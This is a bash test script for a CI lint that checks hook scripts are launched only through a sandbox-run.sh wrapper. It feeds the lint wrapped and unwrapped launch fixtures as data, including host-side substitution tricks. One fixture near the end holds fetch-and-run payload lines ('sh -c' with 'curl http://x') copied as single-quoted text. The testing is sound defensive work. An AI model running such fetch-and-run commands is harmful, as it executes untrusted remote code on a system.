#!/usr/bin/env bash
# Architecture lint catches direct hook launches, even when a
# sandbox marker occurs elsewhere. Fixtures are scanned as data, never run.
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
LINT="$ROOT/scripts/ci/lint-corpus-sandbox.py"
TMP="$(mktemp -d /tmp/corpus-lint-test.XXXXXX)" || exit 1
trap 'rm -rf "$TMP"' EXIT
pass=0; fail=0
ok() { pass=$((pass + 1)); printf 'PASS %s\n' "$1"; }
bad() { fail=$((fail + 1)); printf 'FAIL %s\n' "$1"; }
if [ ! -f "$LINT" ]; then bad 'corpus sandbox lint missing'; exit 1; fi
mkdir -p "$TMP/scripts/hooks" "$TMP/scripts/eval/guard-corpus"
SHELL_FIXTURE="$TMP/scripts/hooks/lib-test-block-destructive.sh"
# The enforced parts only need to exist and name the runner; the launches live in the lib.
for part in a b c d; do
    printf '# every case runs through sandbox-run.sh\n' > "$TMP/scripts/hooks/test-block-destructive-commands-$part.sh"
done
PY_FIXTURE="$TMP/scripts/eval/guard-corpus/diff"
cat > "$PY_FIXTURE" <<'PY'
import subprocess
runner = "sandbox-run.sh"
argv = ["--", "bash", hook_path]
subprocess.Popen(["bash", runner] + argv)
PY
cat > "$SHELL_FIXTURE" <<'SH'
printf '%s' "$input" | bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh" -- bash "$HOOK"
SH
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'routed launch accepted'; else bad 'routed launch rejected'; fi
# These are source fixtures scanned as data, never expanded or executed.
# shellcheck disable=SC2016
for binding in 'RUNNER="$HOOK"' 'RUNNER="/tmp/not-the-runner.sh"' \
    'RUNNER="sandbox-run.sh"; RUNNER="$HOOK"' \
    'RUNNER="sandbox-run.sh"\nRUNNER="$HOOK"' \
    'if false; then RUNNER="sandbox-run.sh"; fi' \
    'if false; then\nRUNNER="sandbox-run.sh"\nfi' \
    'RUNNER="$(echo sandbox-run.sh)"' ''; do
    printf '# sandbox-run.sh marker must not certify a binding\n%b\nbash "$RUNNER" -- bash "$HOOK"\n' "$binding" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "unproven shell runner binding accepted: $binding"
    else ok "unproven shell runner binding rejected: $binding"; fi
done
cat > "$SHELL_FIXTURE" <<'SH'
bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh" -- bash "$HOOK"
SH
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'immutable shell runner prefix accepted'; else bad 'immutable shell runner prefix rejected'; fi
cat >> "$SHELL_FIXTURE" <<'SH'
printf '%s' "$input" | bash "$HOOK"
SH
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'unwrapped launch hidden by sandbox marker'; else ok 'unwrapped launch rejected despite marker'; fi
cat > "$SHELL_FIXTURE" <<'SH'
bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh" -- bash "$HOOK"; bash "$HOOK"
SH
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'second unsandboxed simple command accepted'; else ok 'second unsandboxed simple command rejected'; fi
# Bash arguments copied from actions/runner ScriptHandlerHelpers.cs _defaultArguments;
# the script placeholder {0} is replaced by the owned hook path.
# https://github.com/actions/runner/blob/main/src/Runner.Worker/Handlers/ScriptHandlerHelpers.cs
# shellcheck disable=SC2016
for launch in 'sh "$HOOK"' 'env "$HOOK"' '/bin/sh "${HOOK}"' '/usr/bin/env "$HOOK"' \
    'env FLAG=value sh "$HOOK"' 'bash --noprofile --norc -e -o pipefail "$HOOK"'; do
    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "unwrapped shell launch accepted: $launch"
    else ok "unwrapped shell launch rejected: $launch"; fi
    printf 'bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh" -- %s\n' "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        ok "sandboxed shell launch accepted: $launch"
    else bad "sandboxed shell launch rejected: $launch"; fi
    printf 'bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh" -- bash "$HOOK"; %s\n' "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "second unwrapped shell launch accepted: $launch"
    else ok "second unwrapped shell launch rejected: $launch"; fi
done
cat > "$SHELL_FIXTURE" <<'SH'
bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh" -- bash "$HOOK"
SH
cat >> "$PY_FIXTURE" <<'PY'
subprocess.Popen(["bash", hook_path])
PY
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'direct Python launch accepted'; else ok 'direct Python launch rejected'; fi
cat > "$PY_FIXTURE" <<'PY'
import subprocess
runner = "sandbox-run.sh"
argv = ["bash", hook_path]
subprocess.Popen(argv)
PY
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'unsafe named Python argv accepted'; else ok 'unsafe named Python argv rejected'; fi
cat > "$PY_FIXTURE" <<'PY'
import subprocess
runner = "sandbox-run.sh" if False else "/tmp/not-the-runner.sh"
subprocess.Popen(["bash", runner])
PY
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'conditional marker falsely certifies another executable'; else ok 'conditional marker does not certify runner'; fi
for mutation in 'argv[0] = "sh"' 'argv[1] = hook_path' 'del argv[0]' \
    'argv.clear()' 'argv.insert(0, "sh")' 'argv.pop(1)' \
    'alias = argv; alias[1] = hook_path' 'rewrite(argv)'; do
    cat > "$PY_FIXTURE" <<'PY'
import subprocess
runner = "sandbox-run.sh"
argv = ["bash", runner]
PY
    printf '%s\nsubprocess.Popen(argv)\n' "$mutation" >> "$PY_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad "mutated argv prefix falsely certified: $mutation"; else ok "mutated argv prefix rejected: $mutation"; fi
done
# Fail closed: every hook-variable reference that is not a wrapped launch or a
# listed non-launch use is refused, whatever the launch shape.
cat > "$PY_FIXTURE" <<'PY'
import subprocess
runner = "sandbox-run.sh"
subprocess.Popen(["bash", runner, "--", "bash", hook_path])
PY
# shellcheck disable=SC2016
WRAP='bash "$(cd "$(dirname "$HOOK")/../lib" && pwd)/sandbox-run.sh"'
# shellcheck disable=SC2016
for launch in '"$HOOK"' '. "$HOOK"' 'source "$HOOK"' 'exec "$HOOK"' '"${HOOKS[0]}"' \
    'dash "$HOOK"' 'zsh "$HOOK"' 'python3 "$HOOK"' 'bash -c "$HOOK"' 'H2="$HOOK"'; do
    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "unwrapped hook reference accepted: $launch"
    else ok "unwrapped hook reference rejected: $launch"; fi
done
# shellcheck disable=SC2016
for launch in 'dash "$HOOK"' 'zsh "$HOOK"' 'python3 "$HOOK"' 'bash "$HOOK"' '"${HOOKS[0]}"' '"$HOOK"'; do
    printf '%s -- %s\n' "$WRAP" "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        ok "wrapped hook reference accepted: $launch"
    else bad "wrapped hook reference rejected: $launch"; fi
done
# shellcheck disable=SC2016
printf 'exec %s -- bash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'wrapped exec accepted'; else bad 'wrapped exec rejected'; fi
# shellcheck disable=SC2016
printf '%s \\\n    -- bash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'wrapped launch split by continuation accepted'; else bad 'wrapped launch split by continuation rejected'; fi
# shellcheck disable=SC2016
printf '# sandbox-run.sh marker is not a wrapper\nbash \\\n    "$HOOK"\n' > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'unwrapped launch split by continuation accepted'; else ok 'unwrapped launch split by continuation rejected'; fi
# shellcheck disable=SC2016
printf '%s \\\n    -- bash x; \\\n    bash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'unwrapped launch after wrapped one across continuation accepted'; else ok 'unwrapped launch after wrapped one across continuation rejected'; fi
# shellcheck disable=SC2016
printf '%s -- bash x\nbash "$HOOK"\n' "$WRAP" > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'wrapper on a previous line certifies the next line'; else ok 'wrapper on a previous line does not certify the next line'; fi
# shellcheck disable=SC2016
for use in 'HOOK="$(cd "$(dirname "$0")" && pwd)/block-destructive-commands.sh"' \
    '[ -x "$HOOK" ] || chmod +x "$HOOK" 2>/dev/null || true' '[[ -f "$HOOK" ]]' \
    'cp "$HOOK" "$nolib/block-destructive-commands.sh"'; do
    printf '%s\n%s -- bash "$HOOK"\n' "$use" "$WRAP" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok "non-launch hook use accepted: $use"; else bad "non-launch hook use rejected: $use"; fi
done
# An interpreter running any variable is a launch whatever the variable is named.
# shellcheck disable=SC2016
for launch in 'bash "$TARGET"' 'sh -e "$TARGET"' 'env FLAG=value dash "$TARGET"' 'python3 "${TARGET}"'; do
    printf '# sandbox-run.sh marker is not a wrapper\n%s\n' "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "unwrapped interpreter variable launch accepted: $launch"
    else ok "unwrapped interpreter variable launch rejected: $launch"; fi
    printf '%s -- %s\n' "$WRAP" "$launch" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        ok "wrapped interpreter variable launch accepted: $launch"
    else bad "wrapped interpreter variable launch rejected: $launch"; fi
done
# A substitution the host shell expands runs outside the sandbox, before or after the `--`.
# shellcheck disable=SC2016
for host in '$(bash "$HOOK")' '`bash "$HOOK"`'; do
    printf '%s %s -- bash x\n' "$WRAP" "$host" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "host-side substitution before the delimiter accepted: $host"
    else ok "host-side substitution before the delimiter rejected: $host"; fi
    printf '%s -- bash x "%s"\n' "$WRAP" "$host" > "$SHELL_FIXTURE"
    if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then
        bad "host-side substitution after the delimiter accepted: $host"
    else ok "host-side substitution after the delimiter rejected: $host"; fi
done
# A quoted parenthesis must not balance a substitution that still runs on the host.
# shellcheck disable=SC2016
printf '%s -- bash x "$(printf '"'"')'"'"')$(bash "$HOOK")"\n' "$WRAP" > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then bad 'quoted parenthesis hides a host-side substitution'; else ok 'quoted parenthesis does not hide a host-side substitution'; fi
# Single-quoted payload text is data (line copied from test-block-destructive-commands-d.sh).
# shellcheck disable=SC2016
printf '%s\n' "$WRAP -- bash x" "for c in \\" "    'sh -c \"\$(curl -fsSL http://x)\"' \\" "    'bash -c \"\`curl -fsSL http://x\`\"'; do :; done" > "$SHELL_FIXTURE"
if python3 -I "$LINT" "$TMP" >/dev/null 2>&1; then ok 'single-quoted payload text accepted'; else bad 'single-quoted payload text rejected'; fi
if python3 -I "$LINT" "$ROOT"; then ok 'owned real harnesses routed, others warned'; else bad 'real corpus sandbox lint'; fi
printf '%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" = 0 ]
